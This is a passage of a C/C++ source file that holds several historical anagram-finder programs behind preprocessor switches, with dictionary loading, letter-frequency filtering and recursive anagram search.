        if ( isalpha(buffer[j]) )
        {
            alphaCount[buffer[j] - 'A']++;
            letterCount++;
        }
    }

    // Filter unusable words; store remainder in working dictionary
    char tempAlphaCount[26];
    bool possibleWord;

    workingDict = new char * [wordcount];
    dictSize = 0;
    
    for (i = 0; i < wordcount; i++)
    {
        // Do not use words that are longer than the input string
        // or that are shorter than the minimum word size the user specifies
        if (alphalen(dictionary[i]) > letterCount || 
            alphalen(dictionary[i]) < minWordSize)
                continue;

        // Count individual letters in the word
        possibleWord = true;

        for (j = 0; j < 26; j++)
            tempAlphaCount[j] = 0;

        for (j = 0; j < strlen(dictionary[i]); j++)
        {
            if ( isalpha(dictionary[i][j]) )
                tempAlphaCount[dictionary[i][j] - 'A']++;
        }

        // Do not use words that have more of a particular letter
        // than is in the input string
        for (j = 0; j < 26; j++)
        {
            if (tempAlphaCount[j] > alphaCount[j])
                possibleWord = false;
        }

        // If the word is a candidate word, store in working dictionary
        if (possibleWord)
        {
            workingDict[dictSize] = new char[strlen(dictionary[i]) + 1];
            strcpy(workingDict[dictSize], dictionary[i]);
            dictSize++;
        }
    }

    // Sort working dictionary by size
    qsort(workingDict, dictSize, sizeof(workingDict[0]), sizecmp);

    // Find and print anagrams to file
    int  dictPtr = 0;
    char anagram[MaxWordLength] = "";

    cout << "Saving anagrams to file " << outFile << "..." << endl;
    findAnagrams(anagram, alphaCount, dictPtr, letterCount);

    // Free dictionary memory and clean up code
    out.close();
    emptyDict();

    return 0;
}

// Function: initalizeDict
// Parameters:  dictFile - name of textfile containing words to be used
//                  in dictionary
// Returns: true if initialization succeeds; false otherwise

bool initializeDict(const char *dictFile)
{
    cout << "Initializing the dictionary..." << endl << endl;

    // Open dictionary file for input
    ifstream fin(dictFile, ios::in | ios::nocreate);

    // Determine number of words in dictionary file, and allocate
    // memory for dictionary and alphaDict
    wordcount = 0;
    char buffer[MaxWordLength];
    fin.getline(buffer, MaxWordLength);
    while (strlen(buffer) > 0)
    {
        wordcount++;
        fin.getline(buffer, MaxWordLength);
    }
    fin.close();

    dictionary = new char * [wordcount];

    // Read in words from dictionary file and store in dictionary
    fin.open(dictFile);

    int i;
    for (i = 0; i < wordcount; i++)
    {
        fin.getline(buffer, MaxWordLength);
        strupper(buffer);
        dictionary[i] = new char[strlen(buffer) + 1];
        strcpy(dictionary[i], buffer);
    }
    fin.close();

    return true;
}

// Function: findAnagrams
// Recursively find anagrams for a given word/phrase
// Parameters:  str - string to store anagram in
//              alphaCount - array of letters that remain to be anagrammed
//              dictPtr - reference to index into the working dictionary
//              letterCount - total number of remaining letters to anagram

void findAnagrams(char *str, int alphaCount[26], int &dictPtr, unsigned int letterCount)
{
    // If dictPtr exceeds the size of the dictionary, an anagram cannot
    // be formed; return false
    if (dictPtr >= dictSize)
        return;

    // Make a copy of alphaCount and anagram
    int tempAlphaCount[26];
    unsigned int i, j;
    int tempPtr = dictPtr;
    char anagram[MaxWordLength];

    // Find the next word in the working dictionary that is contained 
    // in the input text
    for ( ; dictPtr < dictSize; dictPtr++)
    {
        // Initialize temporary and local variables in loop
        tempPtr = dictPtr;
        char ch;
        int tempLetterCount = letterCount;
        bool matchFound = true;

        for (i = 0; i < 26; i++)
            tempAlphaCount[i] = alphaCount[i];
        strcpy(anagram, str);

        // Count characters to determine if word can be formed
        // from remaining letters
        for (i = 0; i < strlen(workingDict[tempPtr]); i++)
        {
            ch = workingDict[tempPtr][i];
            if ( isalpha(ch) )
            {
                tempAlphaCount[ch - 'A']--;
                tempLetterCount--;

                // If the count for a particular character falls below 0,
                // the word cannot be formed from the remaining letters
                if (tempAlphaCount[ch - 'A'] < 0)
                {
                    // Restore temporary variables and end loop
                    matchFound = false;
                    tempLetterCount = letterCount;
                    for (j = 0; j < 26; j++)
                        tempAlphaCount[j] = alphaCount[j];
                    break;
                }
            }
        }

        // Only recurse if a matching word is found
        if (matchFound)
        {
            // Add the matched word to the anagram string
            if (strlen(anagram) > 0)
                strcat(anagram, " ");
            strcat(anagram, workingDict[tempPtr]);

            // If all the letters are used up, print the anagram
            if (tempLetterCount == 0)
            {
                out << anagram << endl;
            }
            // Otherwise, recurse to find more words for anagram
            else
            {
                for (tempPtr++; tempPtr < dictSize; tempPtr++)
                {
                    // Find the next word that is not too long
                    if (alphalen(workingDict[tempPtr]) > tempLetterCount)
                        continue;

                    // Find anagrams of the remaining letters
                    findAnagrams(anagram, tempAlphaCount, tempPtr, tempLetterCount);
                }
            }
        }
    }
}

// Function: charcmp
// Purpose:  for use by quicksort(), to sort the letters of a string
//           in alphabetical order
// Parameters:  c1, c2 - chars to be compared
// Returns:  int value representing difference between char's

int charcmp(const void *c1, const void *c2)
{
    return (*(char *)c1 - *(char *)c2);
}

// Function: sizecmp
// Purpose:  for use by quicksort(), to sort the strings in the
//           dictionary by size, largest to smallest
// Parameters:  s1, s2 - strings to be compared
// Returns:  int value representing difference between string sizes

int sizecmp(const void *s1, const void *s2)
{
    return ( alphalen(*(char **)s2) - alphalen(*(char **)s1) );
}

// Function: alphalen
// Calculate the alphabetic length of the string
// Parameters:  str - the string to be examined
// Returns:  the number of alphabetic characters in a string

int  alphalen(const char *str)
{
    unsigned int i = 0;
    int alphaCount = 0;

    for (i = 0; i < strlen(str); i++)
    {
        if ( isalpha(str[i]) )
            alphaCount++;
    }

    return alphaCount;
}

// Function: strupper
// Converts a string to all uppercase letters
// Parameters:  str - the string to be converted

void strupper(char *str)
{
    for (unsigned int i = 0; i < strlen(str); i++)
    {
        if ( isalpha(str[i]) )
            str[i] = toupper(str[i]);
    }
}

// Function: emptyDict
// Purpose:  Free dynamic memory allocated to dictionary arrays

void emptyDict()
{
    int i = 0;

    for (i = 0; i < wordcount; i++)
        delete [] dictionary[i];

    for (i = 0; i < dictSize; i++)
        delete [] workingDict[i];

    delete [] dictionary;
    delete [] workingDict;
}

# endif

/*	____	____	____	____	____	____	____	____	*/

# ifdef ANAGRAM3

/*  anagram.c  14 January 2000  */

/* anagrams of a set of letters */

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <malloc.h>

typedef struct dictent {
  struct dictent *alph;
  struct dictent *len;
  struct dictent *gl;
  char *word;
  int le;
} dent;

#define DE_SIZE    ( sizeof ( dent ) )

/*  GLOBAL DATA  */

dent *aptr[26];
dent *cptr[26][40];
dent *gptr[40];
char  my_argv[10][50];
int   nlets[26];
int   reql[10];
int   rl;
dent *sptr[26][40];
int   stack[50];
int   tl;
int   trl;

void init_prog ( void ) { 

  int i;
  int j;

  fprintf ( stderr, "Initializing...\n" );

  for ( i = 0; i < 26; i++ ) {
    aptr[i] = NULL;
    for ( j = 1; j < 40; j++ ) {
      sptr[i][j] = NULL;
      cptr[i][j] = NULL;
    }
  }
}

void abort_prog ( char *msg )

{
  fprintf( stderr, msg );
  exit( 1 );
}

void read_dict ( void ) {

/*
Purpose:

  Read the word list from the dictionary file.

Modified:

  14 January 2000
*/
  int ai;
  FILE *fp;
  int i;
  int le;
  dent *tdent;
  char *tword;
  char word[40];
  dent *wptr;
  int wi;
/*
  Open the dictionary file.
*/
  fp = fopen ( "/disk2/burkardt/dat/anagram_dictionary.txt", "r" );

  if ( fp == NULL ) {
    printf ( "\n" );
    printf ( "READ_DICT - Fatal error!\n" );
    printf ( "  Could not find the dictionary file:\n" );
    printf ( "  /disk2/burkardt/dat/anagram_dictionary.txt\n" );
    exit ( 1 );
  }

  fprintf ( stderr, "Reading the dictionary file...\n" );

  wptr = NULL;
  ai = 0;

  while ( fscanf ( fp, "%s", word ) != EOF ) {

    le = strlen ( word );
/*
  Move any uppercase characters to lowercase.
*/
    for ( i = 0; i < le; i++ ) {
      if ( word[i] >= 'A' && word[i] <= 'Z' ) {
        word[i] = word[i] + ( 'a' - 'A' );
      }
      if ( word[i] < 'a' || word[i] > 'z' ) {
        break;
      }
    }

    if ( i != le ) {
      continue;
    }

    tdent = (dent *) malloc( DE_SIZE );
    tword = (char *) malloc( le + 1 );

    if ( tdent == NULL || tword == NULL ) {
      abort_prog( "malloc() failed\n" );
    }

    wi = word[0] - 'a';
    strcpy( tword, word );
    tdent->word = tword;
    tdent->le = le;
    tdent->alph = NULL;
    tdent->len = NULL;

    if ( wptr == NULL ) {
      aptr[ai++] = tdent;
    } else {
      if ( wptr->word[0] != word[0] ) aptr[ai++] = tdent;
      wptr->alph = tdent;
    }

    if ( cptr[wi][le] == NULL ) {
      sptr[wi][le] = tdent;
      cptr[wi][le] = tdent;
    } else {
      cptr[wi][le]->len = tdent;
      cptr[wi][le] = tdent;
    }

    wptr = tdent;
  }
}

void check_dict ( void ) {

  int i;
  dent *pt;
  
  for ( i = 0; i < 26; i++ ) {
    printf( "%s ", aptr[i]->word );
  }

  printf( "\n" );

  for ( i = 1; i < 39; i++ ) {
    if ( sptr[0][i] != NULL ) {
      printf( "%s ", sptr[0][i]->word );
    }
  }

  printf( "\n" );
  pt = sptr[3][12];

  while ( pt != NULL ) {
    printf( "%s ", pt->word );
    pt = pt->len;
  }

  printf( "\n" );
}

int get_args ( void ) {

  int i;
  char inp;
  int j;

  printf( "Type in a list of letters, optionally followed by word lengths,\n" );
  printf( "optionally followed by word suggestions.  A blank line exits.\n" );
  printf( "-> " );

  i = 0;
  j = 0;

  do {
    scanf( "%c", &inp );
    if ( inp > ' ' ) {
      if ( j == 0 ) i++;
      if ( inp >= 'A' && inp <= 'Z' ) {
        inp = inp + 'a' - 'A';
      }
      my_argv[i][j++] = inp;
    } else {
      if ( i > 0 ) {
        my_argv[i][j] = '\0';
      }
      j = 0;
    }
  } while ( inp != '\n' );

  return( i - 1 );
}

int parse_args ( int nargs )

{
  int c;
  int i;
  int j;
  int t;

  for ( i = 0; i < 26; i++ ) {
    nlets[i] = 0;
  }

  tl = strlen ( my_argv[1] );

  for ( i = 0; i < tl; i++ ) {
    c = my_argv[1][i];
    if ( c < 'a' || c > 'z' ) break;
    nlets[c - 'a']++;
  }

  if ( i != tl ) {
    abort_prog( "Non-alphabetic characters in input set\n" );
  }

  i = 2;
  rl = 0;

  while ( i < nargs ) {
    if ( my_argv[i][0] < '1' || my_argv[i][0] > '9' ) {
      break;
    }
    reql[rl++] = atoi( my_argv[i++] );
  }

  for ( j = rl - 1; j > 0; j-- )
    for ( c = 0; c < j; c++ )
      if ( reql[c] < reql[c + 1] ) {
        t = reql[c];
        reql[c] = reql[c + 1];
        reql[c + 1] = t;
      }

  for ( j = 0, trl = 0; j < rl; j++ ) {
    trl = trl + reql[j];
  }

/*  
  for ( i = 0; i < rl; i++ ) {
    printf( "%2d ", reql[i] );
  }

  printf( "\n" ); 
*/
  return( i );
}

void find_valid_words ( void ) {

  int c;
  long checked;
  dent *dptr;
  long found;
  int i;
  int j;
  int k;
  long perc;
  int tn[26];
  dent *tp[40];

  checked = 0;
  found = 0;

  for ( i = 0; i < 40; i++ ) {
    gptr[i] = NULL;
  }

  for ( i = 0; i < 26; i++ ) {
    for ( j = 1; j < 40; j++ ) {
      dptr = sptr[i][j];
      while ( dptr != NULL ) {

        for ( k = 0; k < 26; k++ ) {
          tn[k] = nlets[k];
        }

        for ( k = 0; k < j; k++ ) {
          c = dptr->word[k] - 'a';
          if ( --tn[c] < 0 ) {
            break;
          }
        }

        if ( k == j ) {
          if ( gptr[j] == NULL ) {
            gptr[j] = dptr;
            tp[j] = dptr;
          } else {
            tp[j]->gl = dptr;
            tp[j] = dptr;
          }
          dptr->gl = NULL;
          found++;
        }
        dptr = dptr->len;
        checked++;
      }
    }
  }
  perc = 1000 - ( ( found * 10000 + 5 ) / 10 ) / checked;
  fprintf( stderr, "eliminated %2d.%d%% of words\n", perc / 10, perc % 10 );
/*  
  for ( i = 1; i < 40; i++ ) {
    if ( gptr[i] != NULL ) {
      printf( "%s ", gptr[i]->word );
    }
  }
  printf( "\n" ); */
}

void do_search ( char *es, char *sw )

{
  int cl;
  int co;
  int cp;
  int i;
  int j;
  long na;
  int rs;
  int rs2;
  int slev;
  dent *sp[50];
  int tn[26];

  na = 0;
  co = 0;
  fprintf ( stderr, "%sGoing through dictionary...", es );
  find_valid_words();
  fprintf ( stderr, "%sStarting search...\n", es );

  for ( i = 0; i < 50; i++ ) {
    stack[i] = 0;
    sp[i] = NULL;
  }

  cl = tl;
  slev = 0;
  stack[0] = 1;
  sp[0] = gptr[1];

  for ( ;; ) {
    for ( i = 0, j = 0, rs = tl, rs2 = trl; i < rl && j <= slev; ) {
      if ( stack[j] >= reql[i] ) {
        rs -= stack[j];
        if ( stack[j] == reql[i] ) {
          rs2 -= stack[j];
          i++;
        }
        if ( rs < rs2 ) {
          j = -1;
          break;
        }
        j++;
      } else {
        j = -1;
        break;
      }
    }

    if ( j == -1 ) sp[slev] = NULL;

    while ( sp[slev] != NULL ) {

      for ( i = 0; i < 26; i++ ) {
        tn[i] = nlets[i];
      }

      for ( i = 0; i < stack[slev]; i++ ) {
        if ( --tn[( (int) sp[slev]->word[i] ) - 'a'] < 0 ) {
          break;
        }
      }

      if ( i == stack[slev] ) {
        break;
      }
      else {
        sp[slev] = sp[slev]->gl;
      }

    }

    if ( sp[slev] == NULL ) {
      if ( slev != 0 ) {
        if ( stack[slev] < stack[slev - 1] && cl - stack[slev] > 0 ) {
          stack[slev]++;
          if ( stack[slev] != stack[slev - 1] )
            sp[slev] = gptr[stack[slev]];
          else sp[slev] = sp[slev - 1];
        } else {
          stack[slev] = 0;
          sp[slev] = NULL;
          slev--;
          for ( i = 0; i < stack[slev]; i++ )
            nlets[( (int) sp[slev]->word[i] ) - 'a']++;
          sp[slev] = sp[slev]->gl;
          cl = cl + stack[slev];
        }
      } else {
        if ( stack[0] < tl ) {
          stack[0]++;
          sp[0] = gptr[stack[0]];
        } else break;
      }
    } else {
      if ( cl > stack[slev] ) {
        for ( i = 0; i < 26; i++ ) {
          nlets[i] = tn[i];
        }
        cl -= stack[slev];
        slev++;
        stack[slev] = 1;
        sp[slev] = gptr[1];
      } else {
        cp = tl + slev + 3;

        if ( sw != NULL ) {
          cp = cp + 1 + strlen( sw );
        }

        if ( co + cp > 79 ) {
          co = cp;
          printf( "\n" );
        } 
        else {
          co = co + cp;
        }

        printf( "(" );

        if ( sw != NULL ) {
          printf( "%s ", sw );
        }

        for ( i = 0; i <= slev; i++ ) {
          printf( "%s", sp[i]->word );
          if ( i != slev ) {
            printf( " " );
          }
          else {
            printf( ") " );
          }
        }
        na++;
        sp[slev] = sp[slev]->gl;
      }
    }
  }
  printf( "\n*** Total number of anagrams found: %d\n", na );
}

void search ( int suggp, int sugg )

{
  int c;
  int i;
  int j;
  int tn[26];

  if ( suggp == sugg ) {
    do_search ( "", NULL );
    return;
  }

  for ( i = suggp; i < sugg; i++ ) {

    printf( "Target letters: %s\n", my_argv[i] );

    for ( j = 0; j < 26; j++ ) {
      tn[j] = nlets[j];
    }

    for ( j = 0; j < strlen( my_argv[i] ); j++ ) {
      c = my_argv[i][j];
      if ( c < 'a' || c > 'z' ) {
        break;
      }
      if ( --tn[c - 'a'] < 0 ) {
        break;
      }
    }

    if ( j == strlen ( my_argv[i] ) ) {
      for ( j = 0; j < 26; j++ ) {
        nlets[j] = tn[j];
      }
      tl -= strlen( my_argv[i] );
      do_search( "*** ", my_argv[i] );
      for ( j = 0; j < strlen( my_argv[i] ); j++ ) {
        nlets[( (int) my_argv[i][j] ) - 'a']++;
      }
      tl = tl + strlen( my_argv[i] );
    }
  }
}

void main ( int argc, char **argv )

{
  int nargs;

  init_prog ( );

  read_dict ( );

  if ( argc == 1 ) {

    for ( ;; ) {
      nargs = get_args ( );
      if ( nargs == -1 ) {
        exit( 0 );
      }
      search ( parse_args ( nargs + 2 ), nargs + 2 );
    }

  } else {

    for ( nargs = 1; nargs < argc; nargs++ ) {
      strcpy ( my_argv[nargs], argv[nargs] );
    }

    search ( parse_args ( argc ), argc );

    exit ( 0 );

  }
}

# endif

/*	____	____	____	____	____	____	____	____	*/

# ifdef ANAGRAM4

#ifndef lint
static char sccsid[] = "@(#)anagram.c	1.16 (UKC) 20/6/89";
#endif  lint

/*
 *	Find all anagrams of a word or phrase which an be made from the words
 *	of the dictionary which should come in on stdin. All words containing
 *	characters not in the key are rejected out of hand so punctuated and
 *	capitalised words are usually lost.
 *	Eliminates all one-letter "words" except a, i, o.
 *
 *	BUG due to optimisation N: 
 *	If an anagram contains a word twice, there will be duplicate phrases
 *	put out. EG peter collinson
 *		respect ill no no
 *		respect ill no on ***
 *		respect ill on no ***
 *		respect ill on on
 *	This is because the printing routine regurgitates all combinations of
 *	the words, so we get "on no" and "no on". Can be fixed by marking
 *	active words in the printing routine, but it is fiddly.
 *
 *	Martin Guy, University of Kent at Canterbury, December 1985
 */

/*
 * Optimisation N-3:
 * Sort the wordlist into longest-first. This affects the behaviour of the
 * recursive calls and takes 1/2 the time against a random ordering,
 * 1/6th of the time against shortest-first.
 *
 * Optimisation N-2
 * As each pass works through the wordlist seeing what words will fit the
 * letters that are left over from the key once the parent's words have been
 * extracted, it stores this subset of the complete list and passes it down
 * as the wordlist which its child is to work from. A word which is not
 * useful to us is sure not to be useful to any of our children.
 *
 * Optimisation N-1
 * Instead of processing the list from the top down, process it from the bottom
 * up. This makes it easier to build the sub-lists for children, but requires a
 * doubly-linked list to be able to trace back up it. This means that the
 * wordlist has to be sorted the other way for optimisation N-2
 *
 * Optimisation N
 * The words "mart" and "tram" show the same behaviour when computing the
 * anagrams. We can reduce the work we have to do by shortening the wordlist by
 * storing only one of each such word in the wordlist and having the "synonyms"
 * dangling from its cell on a linked list. They are all churned out again in
 * the printing stage.
 * Result:		old	new
 * stuart plant		10.7	9.6
 * peter collinson	297.9	169.7
 * peter collinson -m3	101.5	64.8
 *
 * Optimisation N+1 (unimplemented)
 * For short anagrams, the lion's share of the time is spent in gets().
 * It is silly to read into the stdio buffer, copy across into local buffer
 * and process from there when we could use getc(), save a fn call per word
 * and reduce the amount of shuffling being done.
 */


#include <stdio.h>
#include <ctype.h>

#define MAXWORDS 64		/* Maximum number of words in output phrases */
				/* Also determines maximum recursion depth */

/*
 *	Structure of a cell used to hold a word in the list which has the same
 *	letters as a word we have already found. Idem is latin for "the same".
 */
typedef struct idem {
	char *word;		/* the word exactly as read from the dict */
	struct idem *link;	/* next in the list of similar words */
} idem_t;

/*
 *	Structure of each word read from the dictionary and stored as part
 *	of a possible anagram.
 */

typedef struct cell {
	struct cell *link;	/* To bind the linked list together */
	char *word;		/* At last! The word itself */
	int wordlen;		/* length of the word */

	/* Sub-wordlist reduces problem for children. These pointers are
	 * the heads of a stack of doubly linked lists (!) */
	struct cell **flink;	/* Forward links for doubly linked list */
	struct cell **rlink;	/* Reverse links for doubly linked list */

	/* First element in linked list of words which contain the same letters
	 * (including the original) exactly as they came out of the dict */
	idem_t	idem;
} cell_t;

int freq[256];		/* number of time each character occurs in the key.
			 * Must be initialised to 0s.
			 * Set by buildwordlist, Used by findanags. */
int nletters;		/* Number of letters in key, == sum(freq[*]) */
cell_t *anagword[MAXWORDS];	/* pointers to the cells for the words
				 * making up the anagram under construction */
static int nwords;	/* number of words in current list */

cell_t *buildwordlist();
cell_t *sort();
cell_t *forgelinks();
char *savestr();
char *malloc();
char *strcpy();

char *progname;		/* program name for error reporting */
int vflag = 0;		/* verbose mode: give a running commentary */
int iflag = 0;		/* Ignore case of words' first letters */
int iiflag = 0;		/* decapitalise all characters from dict */
int pflag = 0;		/* Ignore punctuation in words from dict */
int purify = 0;		/* Some munging has to be done on the dict's words */
			/* purify == (iflag || pflag || iiflag) */
int maxgen = 0;		/* Highest number of generations of findanag possible */

main(argc, argv)
char **argv;
{
	register int i, j;
	cell_t *wordlist;

	progname = argv[0];
	
	/*
	 *	Check calling syntax
	 *	This is a disgusting way to process arguments.
	 *	It was never designed; it evolved.
	 *	Learn how to use getopt, or at least use a for loop
	 *	with index into argv. Don't modify your arguments.
	 */
	for (i=1; i<argc && argv[i][0] == '-'; i++) {
	    for (j=1; argv[i][j] != '\0'; j++) {
		switch (argv[i][j]) {
		case 'I':	/* Ignore case completely */
			iiflag = 1;
			purify = 1;
			break;
		case 'i':	/* Initial letter case independent mode */
			iflag = 1;
			purify = 1;
			break;
		case 'p':	/* punctuation-ignoring mode */
			pflag = 1;
			purify = 1;
			break;
		case 'v':	/* verbose mode */
			vflag = 1;
			break;
		case 'm':	/* Set maximum number of words in anagram */
			maxgen = atoi(&argv[i][j+1]);
			if (maxgen <= 0) goto usage;
			goto nextarg;	/* gobbles rest of arg */
			break;
		default:
			goto usage;
		}
	    }
nextarg:    ;
	}

	if (i >= argc) {
usage:		fprintf(stderr, "Usage: %s -v -m# word [word] ...\n", progname);
		fprintf(stderr, "-v\tVerbose: give running commentary.\n");
		fprintf(stderr, "-m#\tMaximum number of words in anagrams.\n");
		fprintf(stderr, "-i\tIgnore case of initial letters of words from dictionary.\n");
		fprintf(stderr, "-I\tIgnore case of all letters of words from dictionary.\n");
		fprintf(stderr, "-p\tIgnore punctuation in words from dictionary.\n");
		exit(1);
	}

	/* i must remain intact until word args have been scanned. */

	if (isatty(0)) {
		if (freopen("/usr/dict/words", "r", stdin) == NULL) {
			fprintf(stderr, "%s: cannot open dictionary.\n", progname);
			exit(1);
		}
	}

	/*
	 *	Fill in frequency of letters in argument.
	 *	freq[*] must have been initialised to 0.
	 */
	nletters = 0;
	for ( /* i left by flag loop */ ; i<argc; i++) {
		for (j=0; argv[i][j] != '\0'; j++) {
			freq[argv[i][j]]++;
			nletters++;
		}
	}

	if (vflag) fprintf(stderr, "%d letters in key.\n", nletters);

	/*
	 *	If no -m option, set the maximum possible recursion depth
	 */
	if (maxgen == 0) maxgen = nletters;

	/*
	 *	If the machine is not fully loaded this will make no difference.
	 *	If it IS, what are you running this cpu gobbler for?
	 */
	(void) nice(5);

	if (vflag) fputs("Building wordlist...\n", stderr);
	wordlist = buildwordlist();
	if (wordlist == NULL) {
		if (vflag) fputs("Empty dictionary or no suitable words.\n", stderr);
		exit(0);
	}

	if (vflag) fputs("Sorting wordlist...\n", stderr);
	wordlist = sort(wordlist);

	if (vflag) {
		fputs("After sorting:\n", stderr);
		printwordlist(wordlist);
	}

	if (vflag) fputs("Searching for anagrams...\n", stderr);
	initfind(wordlist);
	findanags(0, forgelinks(wordlist), nletters);
	exit(0);
}

/*
 *	Read words in from stdin and put candidates into a linked list.
 *	Return the head of the list.
 */
cell_t *
buildwordlist()
{
	register char *cp;		/* Temporary for word-grubbing */
	char *word;			/* Candidate word from dictionary */
	char realword[32];		/* Exactly as read from dictionary */
	cell_t *head = NULL;		/* Head of the linked list */
	cell_t **lastptr = &head;	/* Points to the last link field in the chain */
	cell_t *newcell;		/* Pointer to cell under construction */
	cell_t *cellp;			/* list follower for idem spotting */
	int	len;			/* store length of candidate word */

	nwords = 0;			/* number of words in wordlist */
	while (gets(realword) != NULL) {

		/*
		 * if iflag or pflag, filter the word before processing it.
		 */
		if (!purify) {
			word = realword;
		} else {
			static char buf[32];
			register char *rp, *wp;
			register int differ = 0;

			for (rp = realword, wp = buf; *rp != '\0'; rp++) {
				switch (*rp) {
				case 'a': case 'b': case 'c': case 'd':
				case 'e': case 'f': case 'g': case 'h':
				case 'i': case 'j': case 'k': case 'l':
				case 'm': case 'n': case 'o': case 'p':
				case 'q': case 'r': case 's': case 't':
				case 'u': case 'v': case 'w': case 'x':
				case 'y': case 'z':
				case '0': case '1': case '2': case '3':
				case '4': case '5': case '6': case '7':
				case '8': case '9':
					*wp++ = *rp;
					break;

				case 'A': case 'B': case 'C': case 'D':
				case 'E': case 'F': case 'G': case 'H':
				case 'I': case 'J': case 'K': case 'L':
				case 'M': case 'N': case 'O': case 'P':
				case 'Q': case 'R': case 'S': case 'T':
				case 'U': case 'V': case 'W': case 'X':
				case 'Y': case 'Z':
					if (iiflag || (iflag && rp == realword) ) {
						*wp++ = tolower(*rp);
						differ = 1;
					} else {
						*wp++ = *rp;
					}
					break;
				
				default:
					if (pflag) {
						differ = 1;
					} else {
						*wp++ = *rp;
					}
				}
			}
			*wp = '\0';
			word = differ ? buf : realword;
		}

		/*
		 *	Throw out all one-letter words except for a, i, o.
		 */
		if (word[1] == '\0') {
			switch (word[0]) {
			case 'a':
			case 'i':
			case 'o':
				break;
			default:
				goto nextword;
			}
		}

		/*
		 *	Reject the word if it contains any character which
		 *	wasn't in the key.
		 */
		for (cp = word; *cp != '\0'; cp++) {
			if (freq[*cp] == 0) {
				/* The word contains an illegal char */
				goto nextword;
				/* shame about the break statement */
			}
		}
		/*
		 *	This word merits further inspection. See if it contains
		 *	no more of any letter than the original.
		 */
		for (cp=word; *cp != '\0'; cp++) {
			if (freq[*cp] <= 0) {
				/* We have run out of this letter.
				 * try next word */
				goto restore;
			} /* else */
			freq[*cp]--;
		}

		len = cp - word;	/* the length of the word */
		/*
		 * See if this word contains the same letters as a previous one
		 * If so, tack it on to that word's idem list.
		 */
		/* Scan down the wordlist looking for a match */
		for (cellp = head; cellp != NULL; cellp = cellp->link) {
			if (len == cellp->wordlen && sameletters(word, cellp->word)) {
				/* Seen one like this before.
				 * Put it on the idem list */
				register idem_t *newidem;

				newidem = (idem_t *) malloc(sizeof(idem_t));
				if (newidem == NULL) oom("idemword");
				newidem->word = savestr(realword);
				newidem->link = cellp->idem.link;
				cellp->idem.link = newidem;

				goto restore;
			}
		}

		/*
		 *	the word passed all the tests
		 *	Construct a new cell and attach it to the list.
		 */
		/* Get a new cell */
		newcell = (cell_t *) malloc(sizeof(cell_t));
		if (newcell == NULL) oom("buildwordlist");

		newcell->word = savestr(word);

		/* remember the length for optimising findanag and sorting */
		newcell->wordlen = cp - word;

		/* If realword differs from pure word, store it separately */
		if (realword == word) {
			newcell->idem.word = newcell->word;
		} else {
			newcell->idem.word = savestr(realword);
		}
		/* Only one item in idem list so far; mark end of list */
		newcell->idem.link = NULL;
			
		/* Mark it as the end of the list */
		newcell->link = NULL;

		/* Point the old tail-cell at it */
		*lastptr = newcell;

		/* And remember the new one as the tail cell */
		lastptr = &(newcell->link);
		
		nwords++;
restore:	
		/*
		 * Restore freq[] to its original state; this is quicker than
		 * doing a block copy into a temporary array and munging that.
		 * At this point, cp is either pointing to the terminating null
		 * or to the first letter in the word for which freq == 0.
		 * So all the freq[] entries for [word..(cp-1)] have been
		 * decremented. Put them back.
		 */
		for ( --cp; cp >= word; --cp ) {
			freq[*cp]++;
		}
nextword:	;
	}
	if (vflag) fprintf(stderr, "%d suitable words found\n", nwords);

	return(head);
}

/*
 *	Do the two words contain the same letters?
 *	It must be guaranteed by the caller that they are the same length.
 */
int
sameletters(word1, word2)
char *word1, *word2;
{
	static int slfreq[256];	/* auto-initialised to 0s. */
	register char *cp;	/* to skip through words */

	for (cp = word1; *cp != '\0'; cp++) slfreq[*cp]++;
	for (cp = word2; *cp != '\0'; cp++) {
		if (--slfreq[*cp] < 0) {
			/* fail! undo the damage done by word2 */
			while (cp >= word2) slfreq[*cp--]++;
			/* and by word1 */
			for (cp = word1; *cp != '\0'; cp++) slfreq[*cp]--;
			return(0);
		}
	}
	/* success! slfreq must be all 0s now. */
	return(1);
}

/*
 *	Comparison function for sort so that longest words come first
 */
static int
islonger(first, second)
char *first, *second;
{
	return((*(cell_t **)second)->wordlen - (*(cell_t **)first)->wordlen);
}

/*
 *	Sort the wordlist by word length so that the longest is at the head.
 *	Return the new head of the list.
 */
cell_t *
sort(head)
cell_t *head;
{
	register cell_t **sortbase;	/* Array of pointers to cells */
	register int i;			/* Loop index */
	register cell_t *cp;		/* Loop index */
	cell_t *newhead;		/* hold return value so we can free */

	sortbase = (cell_t **) malloc((unsigned)nwords * sizeof(cell_t *));
	if (sortbase == NULL) oom("buildwordlist while sorting");

	/*
	 *	Reference all strings from the array
	 */
	for (cp=head,i=0; cp!=NULL; cp=cp->link,i++) {
		sortbase[i] = cp;
	}

	/* Check just in case */
	if (i != nwords) {
		/* nwords disagrees with the length of the linked list */
		fprintf(stderr, "%s: Aagh! Despair! %d %d\n",
			progname, i, nwords);
		abort();
	}

	qsort((char *) sortbase, nwords, sizeof(cell_t *), islonger);

	/*
	 * Re-forge the linked list according to the sorted array of pointers
	 */
	for (i=0; i<nwords-1; i++) {
		sortbase[i]->link = sortbase[i+1];
	}
	sortbase[nwords-1]->link = NULL;

	newhead = sortbase[0];
	free((char *)sortbase);
	return(newhead);
}

/* Out Of Memory */
oom(where)
char *where;
{
	fprintf(stderr, "%s: Out of memory in %s.\n", progname, where);
	exit(1);
}

initfind(head)
cell_t *head;
{
	cell_t *cp;

	/*
	 *	Get some memory for the sub-wordlists
	 */
	for (cp = head; cp != NULL; cp = cp->link) {
		cp->flink = (cell_t **) malloc((unsigned)maxgen * sizeof(cell_t *));
		if (cp->flink == NULL) oom("initfind");
		cp->rlink = (cell_t **) malloc((unsigned)maxgen * sizeof(cell_t *));
		if (cp->rlink == NULL) oom("initfind");
	}
}

/*
 *	Print out all anagrams which can be made from the wordlist wordl
 *	out of the letters left in freq[].
 *	(cell)->[fr]link[generation] is the word list we are to scan.
 *	Scan from the tail back to the head; (head->rlink[gen]==NULL)
 */
findanags(generation, wordlt, nleft)
int generation;		/* depth of recursion */
cell_t *wordlt;		/* the tail of the wordlist we are to use */
int nleft;		/* number of unclaimed chars from key */
{
	register cell_t *cellp;		/* for tracing down the wordlist */
	register char *cp;		/* for inspecting each word */
	register int nl;		/* copy of nleft for munging */
	register char *cp2;		/* temp for speed */
	register cell_t *myhead = NULL;	/* list of words we found suitable */
	register cell_t *mytail;	/* tail of our list of words */

	/*
	 *	Loop from the tail cell back up to and including the
	 *	head of the wordlist
	 */
	for (cellp = wordlt; cellp != NULL; cellp = cellp->rlink[generation]) {
		/*
		 *	This looks remarkably like bits of buildwordlist.
		 *
